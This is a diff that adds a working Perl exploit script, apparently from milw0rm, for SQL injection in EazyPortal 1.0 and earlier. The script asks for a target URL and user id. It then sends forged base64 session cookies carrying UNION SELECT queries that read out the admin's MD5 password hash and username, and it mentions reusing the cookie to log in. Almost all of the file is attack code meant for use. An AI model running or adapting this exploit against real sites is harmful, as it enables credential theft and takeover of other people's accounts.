@@ -1,0 +1,106 @@
+#!/usr/bin/perl
+#
+#	Vendor url: http://www.eazyportal.com/
+#
+#	by Iron - http://www.randombase.com
+#
+#	exploit goes through $_COOKIE
+#
+use LWP::UserAgent;
+use MIME::Base64;
+ 
+print "#
+# EazyPortal <= 1.0 SQL Injection Exploit
+# By Iron - www.randombase.com
+# Greets to everyone at RootShell Security Group
+# 
+# Example target url: http://www.target.com/Portal/
+Target url?";
+chomp($target=<stdin>);
+if($target !~ /^http:\/\//)
+{
+	$target = "http://".$target;
+}
+if($target !~ /\/$/)
+{
+	$target .= "/";
+}
+print "User id to retrieve name/password from? (1 = admin by default)";
+chomp($target_id=<stdin>);
+print "\n[+]Retrieving table prefix...";
+@header = ('Cookie' => ' session_vars=YTo2OntzOjU6InVuYW1lIjtzOjEyOiInIEVSUk9SIFpPTUciO3M6NDoidXB3ZCI7czozMjoiMDk4ZjZiY2Q0NjIxZDM3M2NhZGU0ZTgzMjYyN2I0ZjYiO3M6MzoidWlkIjtzOjE6IjEiO3M6NDoidWdtdCI7czoyOiIrMCI7czoxMDoidWxhc3R2aXNpdCI7czoxMDoiMTIwNDA0NjIwNiI7czo0OiJwcml2IjthOjk6e3M6NDoibmV3cyI7czo0OiJuZXdzIjtzOjU6InBvbGxzIjtzOjI6InBvIjtzOjc6Im1haWxpbmciO3M6MjoibWEiO3M6NToicGFnZXMiO3M6MjoicGEiO3M6NToidXNlcnMiO3M6MjoidXMiO3M6ODoic2V0dGluZ3MiO3M6Mjoic2UiO3M6NToiZm9ydW0iO3M6MjoiZm8iO3M6NjoiYmxvY2tzIjtzOjI6ImJsIjtzOjg6ImRvd25sb2FkIjtzOjI6ImRvIjt9fQ==');
+$ua = LWP::UserAgent->new;
+$ua->timeout(10);
+$ua->env_proxy;
+$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201 Firefox/2.0.0.12");
+$response = $ua->get($target, @header);
+if ($response->is_success)
+{
+#print $response->content;
+	if($response->content =~ /select \* from (.*)users where ustatus/i)
+	{
+		print "\n[+]Got prefix: $1";
+		$prefix = $1;
+	}
+	else
+	{
+		print "\n[-]Failed, trying empty prefix.";
+		$prefix = "";
+	}
+}
+else
+{
+ die "Error: ".$response->status_line;
+}
+print "\n[+]Building cookie";
+$query = "lalalalalala' UNION SELECT upwd,upwd,upwd,upwd,upwd,upwd,upwd,upwd,upwd,upwd,upwd,upwd,upwd,upwd,upwd FROM ".$prefix."users WHERE 1=1 AND uid ='".$target_id; #fucked up query but it works :)
+$cookie = encode_base64('a:6:{s:5:"uname";s:'.length($query).':"'.$query.'";s:4:"upwd";s:17:"\' OR upwd != \'lol";s:3:"uid";s:1:"1";s:4:"ugmt";s:2:"+0";s:10:"ulastvisit";s:10:"1204046206";s:4:"priv";a:9:{s:4:"news";s:4:"news";s:5:"polls";s:2:"po";s:7:"mailing";s:2:"ma";s:5:"pages";s:2:"pa";s:5:"users";s:2:"us";s:8:"settings";s:2:"se";s:5:"forum";s:2:"fo";s:6:"blocks";s:2:"bl";s:8:"download";s:2:"do";}}');
+$cookie =~ s/\n//g;
+$logincookie = $cookie;
+print "\n[+]Eating cookie :P";
+print "\n[+]Retrieving password";
+@header = ('Cookie' => 'session_vars='.$cookie);
+$response = $ua->get($target, @header);
+if ($response->is_success)
+{
+	if($response->content =~ /([a-f0-9]{32})/i)
+	{
+		$p = $1;
+	}
+	else
+	{
+		print "\n[-]Exploit failed :'(";
+		exit;
+	}
+}
+else
+{
+ die "Error: ".$response->status_line;
+}
+print "\n[+]Retrieving username";
+$query = "lalalalalala' UNION SELECT uname,uname,uname,uname,uname,uname,uname,uname,uname,uname,uname,uname,uname,uname,uname FROM ".$prefix."users WHERE 1=1 AND uid ='".$target_id;
+$cookie = encode_base64('a:6:{s:5:"uname";s:'.length($query).':"'.$query.'";s:4:"upwd";s:17:"\' OR upwd != \'lol";s:3:"uid";s:1:"1";s:4:"ugmt";s:2:"+0";s:10:"ulastvisit";s:10:"1204046206";s:4:"priv";a:9:{s:4:"news";s:4:"news";s:5:"polls";s:2:"po";s:7:"mailing";s:2:"ma";s:5:"pages";s:2:"pa";s:5:"users";s:2:"us";s:8:"settings";s:2:"se";s:5:"forum";s:2:"fo";s:6:"blocks";s:2:"bl";s:8:"download";s:2:"do";}}');
+$cookie =~ s/\n//g;
+@header = ('Cookie' => 'session_vars='.$cookie);
+$response = $ua->get($target, @header);
+if ($response->is_success)
+{
+	if($response->content =~ />Log Out \((.*)\)<\/a>/i)
+	{
+		print "\n[+]Exploit succeeded!";
+		print "\n"."#" x 50 ."\n[+]Username: $1";
+		print "\n[+]Password: $p"."\n"."#" x 50;
+	}
+	else
+	{
+		print "\n[-]Exploit only got md5 pass :O";
+		print "\n[+]Password: $p";
+	}
+#	print "\n\n:[+]You can also login with this cookie:\n"."#" x 50 ."\n$logincookie\n"."#" x 50; #uncomment if you have troubles cracking the hash
+}
+else
+{
+ die "Error: ".$response->status_line;
+}
+
+# milw0rm.com [2008-02-27]
